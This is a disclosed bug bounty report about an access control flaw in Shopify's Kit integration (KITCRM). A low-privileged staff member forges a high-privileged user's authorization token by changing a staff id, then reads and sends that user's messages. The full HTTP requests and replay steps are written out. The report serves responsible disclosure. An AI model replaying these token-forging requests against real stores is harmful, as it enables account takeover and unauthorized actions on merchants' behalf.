# Low privileged user can create high privileged user's KITCRM authorization token and can read and write message to KIT

## Report Details
- **Report ID**: 909863
- **URL**: https://hackerone.com/reports/909863
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-27T19:10:21.043Z
- **Disclosed**: 2021-02-07T17:36:41.431Z

## Reporter
- **Username**: sandeep_rj49
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Using the Shopify ping application a user can communicate with the kit. The kit is an application that creates tasks based on the information supplied through the Shopify ping app by a user. With a few quick messages to Kit using Shopify Ping,  a user can create a discount code and promote it, start a retargeting campaign to bring visitors back to your store, send thank you emails to customers, and much more!

###Who has access to the Shopify PING application?
Full permission users have access to the Shopify ping application. And they can communicate with KIT also using the Shopify ping application.

Low privileged user having no or very low permission is not allowed to log in to the Shopify ping application and thus not allowed to communicate with the kit application.

### What is the bug?
Low privileged who do not have access to the Shopify ping application can create a Shopify ping access token using the login API. Using the Shopify ping access token, a low privileged user can create any user's  KITCRM authorization token. 

While creating the KITCRM authorization token, the vulnerable request asks for user id (staff member id). A low privileged user can create the high privileged user's   KITCRM authorization token by supplying the high privileged user's id in the id parameter of the vulnerable request 1. The response will disclose the high privileged user's KITCRM authorization token. Using the high privileged user's KITCRM authorization token, a low privileged user can read the conversation between high role user and kit and can also send the new instructions to kit using high privileged user token.

###Vulnerable request 1:

Request 1: Generate a high role user's KITCRM authorization token using low privileged user's Shopify ping access token.

```
POST /api/v1/arro_token?access_token=███████&myshopify_domain=alwayzhack.myshopify.com&id=42668326968 HTTP/1.1
Host: www.kitcrm.com
Content-Type: application/json
Cookie: 
Connection: close
Accept: application/json
X-DeviceID: 
User-Agent: Shopify Ping/iOS/2.5.4 (iPhone12,3/com.shopify.ping/13.1.1) - Build 3006
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Content-Length: 0
```
Supply low privileged user's Shopify ping access token in `access_token` parameter value. Change `myshopify_domain ` with yours and `id` parameter value with high privileged user's staff memberid. The response will disclose high privileged user's KITCRM authorization token.

Response:
████████

Request 2: Display high privileged user's communication with kit

```
GET /api/v2/messages HTTP/1.1
Host: www.kitcrm.com
Content-Type: application/json
Cookie: 
Connection: close
Accept: application/json
User-Agent: Shopify Ping/2.5.4 (com.shopify.ping; build:3006; iOS 13.1.1) Alamofire/4.8.2
Authorization: Bearer ████████
Accept-Encoding: gzip, deflate
Accept-Language: en-IN;q=1.0, hi-IN;q=0.9
```

Request 3: Send message to kit using high privileged user's chatbox

```
POST /api/v2/messages HTTP/1.1
Host: www.kitcrm.com
Accept: application/json
Authorization: Bearer 1fbb7a0ebb0dd18c2f3697f51fde49a541a30608255d9a1a258XXXXXXXX
Accept-Encoding: gzip, deflate
Accept-Language: en-us
Content-Type: application/json
Content-Length: 40
X-Shopify-Access-Token: 
Connection: close
X-DeviceID: 
User-Agent: Shopify Ping/iOS/2.5.4 (iPhone12,3/com.shopify.ping/13.1.1) - Build 3006

{
  "incoming_message" : "testtesthai"
}
```

Steps to reproduce:
1. login to the Shopify ping application using high privileged user account credentials.
2. Do some chat with the kit in Shopify ping.
3. Add a low privileged user in your Shopify test account and assign no or very low permission to the low privileged user.
3. Use Shopify ping login API - `POST /admin/api/xauth HTTP/1.1` to create a low privileged user's access token using low privileged user account credentials. 
4. Use low privileged user's Shopify ping access token in the vulnerable request 1. 
5. Input high privileged user's staff member id in the `id` parameter of the vulnerable request 1. 
6. Replay the vulnerable request 1 in the burp suite proxy. The response will disclose high privileged user's KITCRM authorization token.
7. Use high privileged user's authorization token in vulnerable request 2 to view  high privileged user's chat with the kit.
8. To send the command to the kit, replay the vulnerable request 3 with high privileged user's KITCRM authorization token. Instruction will be sent to the kit.

## Impact

A low privileged user can create high privileged user's KITCRM authorization token and can view high privileged user's communication with kit. Also, low privileged users can give new instructions to kit using the discovered high privileged user authorization token. 

When all the communication will be done using a high privileged user account, so tracking the attacker will be difficult.

## Attachments
No attachments
